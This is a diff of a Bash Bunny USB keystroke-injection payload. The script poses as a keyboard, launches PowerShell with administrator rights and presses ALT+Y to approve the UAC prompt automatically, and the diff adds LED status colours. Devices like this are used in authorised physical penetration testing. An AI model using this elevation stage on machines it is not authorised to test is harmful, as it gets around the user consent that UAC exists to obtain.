@@ -1,19 +1,29 @@
-EM === Bash Bunny: Open PowerShell as Administrator ===
-REM Target OS: Windows 10 / 11
-REM Keyboard: US
-
+REM === Bash Bunny: Open PowerShell as Administrator + LED Feedback ===
 ATTACKMODE HID
+
+REM Amber: payload starting / device enumerating
+LED AMBER
 DELAY 3000
 
-REM Open Run dialog
+REM Blue: launching Run box
+LED BLUE
 GUI r
-DELAY 500
+DELAY 600
 
-REM Launch PowerShell
+REM Blue (blink): typing + requesting elevation
+LED B
 STRING powershell
-DELAY 500
+DELAY 300
 CTRL SHIFT ENTER
-DELAY 1500
 
-REM Accept UAC prompt (ALT + Y works on most US systems)
+REM Purple: waiting for UAC prompt
+LED PURPLE
+DELAY 1800
+
+REM Yellow: attempting to approve UAC
+LED YELLOW
 ALT y
+DELAY 800
+
+REM Green: completed (doesn't guarantee UAC accepted, but marks end of attempt)
+LED GREEN
